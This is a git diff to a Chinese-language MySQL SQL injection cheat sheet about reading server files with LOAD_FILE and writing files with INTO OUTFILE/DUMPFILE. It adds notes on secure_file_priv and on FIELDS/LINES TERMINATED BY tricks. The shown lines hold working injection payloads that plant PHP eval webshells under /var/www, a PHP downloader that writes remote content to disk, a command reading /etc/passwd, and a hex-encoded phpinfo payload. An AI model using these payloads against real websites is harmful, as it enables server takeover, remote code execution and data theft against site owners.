@@ -297,6 +297,7 @@ load_file() 函数（win系统的C:\boot.ini）
 - 文件必须在服务器上。  
 - LOAD_FILE()函数操作文件的当前目录是@@datadir 。  
 - 需要连接数据库的用户有file_priv 权限，且启动mysqld 用户必须拥有对此文件读取的权限。  
+- 如果secure_file_priv非空，则只能读取对应目录下的文件
 > For security reasons, when reading text files located on the server, the files must either reside in the database directory or be readable by all. Also, to use LOAD DATA INFILE on server files, you must have the **FILE privilege**.
 - 文件大小必须小于 max_allowed_packet。  
 - @@max_allowed_packet的默认大小是1047552 字节.  
@@ -325,10 +326,15 @@ mysql>load data infile '/tmp/potatoes' into table potatoes;
 `mysql>system cat /etc/passwd`
  
 ## 三、写文件
-需要连接数据库的用户有file_priv 权限，且启动mysqld 的用户对目录需要有写权限，需要物理路径（爆路径漏洞或phpinfo），不存在重名文件，不过滤`'"`(因为没有办法编码路径名)。注意：普通用户创建的文件默认权限是 644，但如php/jsp/asp 这些脚本是不需要可执行权限就能访问而被执行的，如 perl/python/bash/c++ 等写成的cgi 是需要可执行权限才能执行的。  
+需要连接数据库的用户有file_priv 权限，且启动mysqld 的用户对目录需要有写权限，需要物理路径（爆路径漏洞或phpinfo），不存在重名文件，不过滤`'"`(因为没有办法编码路径名)，如果secure_file_priv非空，则写入文件的目录只能为对应目录下。注意：普通用户创建的文件默认权限是 644，但如php/jsp/asp 这些脚本是不需要可执行权限就能访问而被执行的，如 perl/python/bash/c++ 等写成的cgi 是需要可执行权限才能执行的。  
 `test.php?id=1 union select 1,2,3,4,"<?php @eval($_POST[cmd])?>",6 into outfile "/var/www/shell.php"`  
 `test.php?id=1 union select 1,2,3,4,"<?php @eval($_POST[cmd])?>",6 into dumpfile "/var/www/shell.php"`  
 `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'`  
+FIELDS TERMINATED BY 原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容，例如下面语句：  
+`SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e`  
+写入的文件中只包含username的值而没有webshell内容;    
+
+LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以用于limit等不能union的语句之后进行写文件操作。  
 
 dumpfile与outfile函数区别  
  
